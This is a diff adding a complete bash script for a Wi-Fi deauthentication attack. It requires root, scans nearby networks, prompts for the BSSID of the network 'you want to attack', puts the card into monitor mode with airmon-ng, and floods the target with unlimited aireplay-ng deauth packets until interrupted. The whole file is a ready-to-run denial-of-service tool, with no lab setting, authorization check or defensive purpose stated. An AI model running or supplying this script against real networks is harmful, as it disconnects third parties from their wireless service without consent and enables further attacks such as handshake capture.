@@ -1,0 +1,76 @@
+#!/bin/bash
+source "colors.sh"
+INTERFACE=$1
+
+if [[ "${EUID}" -ne 0 ]]; then
+    echo -e "${red}[ERROR]${reset} You Must Be A ROOT To Run This Script!"
+    exit 1
+fi
+
+if [[ "$#" -ne 1 ]]; then 
+    echo -e "${red}[ERROR]${reset} You Must Provide 1 Args ...."
+    echo -e "${red}[USAGE]${reset} $0 <INTERFACE> ..."
+    exit 1
+fi 
+
+if [[ ! -e "/sys/class/net/${INTERFACE}" ]]; then
+    echo -e "${red}[ERROR]${reset} Interface : ${INTERFACE} Not Found ...."
+    exit 1
+fi
+
+# Function to handle SIGINT (Ctrl + C)
+cleanup() {
+    echo -e "\nCaught Ctrl + C! Stopping deauth attack..."
+    kill $DEAUTH_PID  # Kill the aireplay-ng process
+    wait $DEAUTH_PID 2>/dev/null  # Wait for the process to terminate
+}
+
+# Trap SIGINT and call the cleanup function
+trap cleanup SIGINT
+
+deauth() {
+    aireplay-ng --deauth 0 -a "${BSSID}" "${INTERFACE}" &
+    DEAUTH_PID=$!  # Store the PID of the aireplay-ng process
+    wait $DEAUTH_PID  # Wait for the aireplay-ng process to finish
+}
+
+echo -e "${red}[SCAN]${reset} Scanning For Available Networks ...."
+OUTPUT=$(nmcli -f BSSID,SSID,CHAN dev wifi | grep -Ev '^(BSSID|SSID|CHAN|$)' | sort | uniq)
+
+if [[ -z "${OUTPUT}" ]]; then
+    echo -e "${red}[ERROR]${reset} No Networks found ...."
+    exit 1
+fi
+
+echo -e "${green}[INFO]${reset} Available Networks :"
+echo -e "${OUTPUT}"
+echo 
+echo -e "${green}[INFO]${reset} Enter The BSSID Of The Network You Want To Attack :"
+read -r BSSID
+
+CHANNEL=$(echo "${OUTPUT}" | grep -m 1 "${BSSID}" | awk '{print $3}')
+echo -e "${green}[INFO]${reset} Channel : ${CHANNEL}"
+echo -e "${green}[INFO]${reset} BSSID : ${BSSID}"
+echo -e "${green}[INFO]${reset} Interface : ${INTERFACE}"
+echo -e "${green}[INFO]${reset} Starting Monitor Mode On Interface : ${INTERFACE} ...."
+
+airmon-ng start "${INTERFACE}" >& /dev/null
+airmon-ng check kill >& /dev/null
+INTERFACE="${INTERFACE}mon"
+echo -e "${green}[INFO]${reset} Interface In Monitor Mode : ${INTERFACE}"
+
+echo -e "${green}[INFO]${reset} Starting Deauth Attack On BSSID : ${BSSID} ....."
+iwconfig "${INTERFACE}" channel "${CHANNEL}"
+
+# Start the deauth function
+deauth
+
+# This part will be reached after Ctrl + C is pressed
+echo 
+echo -e "${green}[INFO]${reset} Deauth Attack Finished ...."
+echo -e "${green}[INFO]${reset} Stopping Interface : ${INTERFACE} ...."
+airmon-ng stop "${INTERFACE}" >& /dev/null
+echo -e "${green}[INFO]${reset} Interface Stopped Successfully"
+systemctl restart NetworkManager
+echo -e "${green}[INFO]${reset} NetworkManager Restarted"
+exit 0
